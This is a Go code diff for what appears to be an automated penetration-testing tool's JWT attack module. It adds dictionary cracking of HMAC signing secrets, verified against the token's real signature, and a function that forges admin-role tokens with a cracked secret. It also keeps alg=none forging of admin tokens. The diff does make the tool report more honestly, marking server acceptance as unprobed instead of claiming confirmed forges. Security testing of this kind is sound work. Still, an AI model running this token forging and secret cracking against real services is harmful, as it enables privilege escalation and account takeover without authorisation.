@@ -63,11 +63,14 @@ func (a *JWTForgeAction) Execute(ctx context.Context, target string, kb *Knowled
 		alg, _ := header["alg"].(string)
 
 		if containsFold(alg, "none") || sig == "" || sig == "none" {
+			// The header ALGORITHM is wire evidence, but server ACCEPTANCE
+			// of a forged none-token was never probed here — this is a lead
+			// worth testing, not a confirmed forge.
 			findings = append(findings, Finding{
 				Type:        "jwt_none",
-				Name:        "JWT uses 'none' algorithm — trivial forge",
-				Severity:    SevCritical,
-				Description: "Token accepts alg=none, can forge any user/role",
+				Name:        "JWT carries alg=none — unsigned token, acceptance unprobed",
+				Severity:    SevMedium,
+				Description: "Observed token needs no signature; verify whether the server accepts a re-issued none-alg token before treating this as a forge",
 				Evidence:    jwt.Raw,
 			})
 			spawned = append(spawned, &JWTForgeNoneAction{original: jwt.Raw, header: header, payload: payload})
@@ -84,18 +87,42 @@ func (a *JWTForgeAction) Execute(ctx context.Context, target string, kb *Knowled
 			}
 		}
 
-		if sig != "" && len(sig) > 0 {
+		// Verify, don't guess: a candidate secret counts only when the
+		// HMAC it computes matches the token's actual signature. The old
+		// loop emitted one "candidate" finding per dictionary word because
+		// it tested signJWT's output against the empty string.
+		if sig != "" && strings.HasPrefix(strings.ToUpper(alg), "HS") {
+			cracked := ""
 			for _, secret := range commonSecrets {
-				forged := signJWT(payload, secret)
-				if forged != "" {
-					findings = append(findings, Finding{
-						Type:        "jwt_cracked_candidate",
-						Name:        fmt.Sprintf("JWT signing candidate: '%s'", secret),
-						Severity:    SevLow,
-						Description: fmt.Sprintf("Trying secret '%s' — verify manually", secret),
-						Evidence:    forged,
-					})
+				if hmacSecretMatches(jwt.Raw, secret) {
+					cracked = secret
+					break
 				}
+			}
+			if cracked != "" {
+				forged := signJWTRoleEscalated(payload, cracked)
+				findings = append(findings, Finding{
+					Type:        "jwt_secret_verified",
+					Name:        fmt.Sprintf("JWT signing secret confirmed: HMAC matches '%s'", cracked),
+					Severity:    SevHigh,
+					Description: "Mathematical verification: this secret reproduces the token's signature — any token can be forged, including role escalation",
+					Evidence:    forged,
+				})
+				kb.AddJWT(JWTToken{
+					Raw:       forged,
+					Algorithm: alg,
+					Header:    header,
+					Payload:   payload,
+					Role:      "admin",
+					Valid:     false, // acceptance still unprobed — never attached
+				})
+			} else {
+				findings = append(findings, Finding{
+					Type:        "jwt_crack_miss",
+					Name:        "JWT HMAC secret not in candidate list",
+					Severity:    SevInfo,
+					Description: fmt.Sprintf("No verified HMAC match across %d candidate secrets", len(commonSecrets)),
+				})
 			}
 		}
 	}
@@ -150,10 +177,6 @@ func (a *JWTForgeNoneAction) Execute(ctx context.Context, target string, kb *Kno
 		}
 	}
 
-	for _, tok := range tokens {
-		kb.Session.AddToken(tok)
-	}
-
 	kb.AddJWT(JWTToken{
 		Raw:       tokens[0],
 		Algorithm: "none",
@@ -178,9 +201,9 @@ func (a *JWTForgeNoneAction) Execute(ctx context.Context, target string, kb *Kno
 	findings := []Finding{
 		{
 			Type:        "jwt_forged_none",
-			Name:        "JWT forged with alg=none admin token",
-			Severity:    SevCritical,
-			Description: "Successfully forged admin JWT using alg=none — try on admin endpoints",
+			Name:        "alg=none admin token prepared — acceptance unprobed",
+			Severity:    SevMedium,
+			Description: "Forged locally with alg=none and escalated role; no request carrying it was ever validated by the target",
 			Evidence:    tokens[0],
 			Details:     map[string]string{"tokens": fmt.Sprintf("%d variants generated", len(tokens))},
 		},
@@ -233,6 +256,31 @@ func signJWT(payload map[string]any, secret string) string {
 	sig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
 
 	return headerB64 + "." + payloadB64 + "." + sig
+}
+
+// hmacSecretMatches verifies a candidate secret against the token's REAL
+// signature — constant-time compare over the original wire bytes. Re-signing
+// a re-marshalled payload is not the comparison basis: JSON key order can
+// differ from what the server signed, which would hide true matches and
+// invent fake ones.
+func hmacSecretMatches(raw, secret string) bool {
+	parts := strings.Split(raw, ".")
+	if len(parts) != 3 || parts[2] == "" {
+		return false
+	}
+	mac := hmac.New(sha256.New, []byte(secret))
+	mac.Write([]byte(parts[0] + "." + parts[1]))
+	want := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
+	return hmac.Equal([]byte(want), []byte(parts[2]))
+}
+
+// signJWTRoleEscalated mints an admin-role token with a secret whose HMAC
+// was verified against the target's own signature.
+func signJWTRoleEscalated(payload map[string]any, secret string) string {
+	if _, ok := payload["role"]; ok {
+		payload["role"] = "admin"
+	}
+	return signJWT(payload, secret)
 }
 
 func truncateMap(m map[string]any) string {
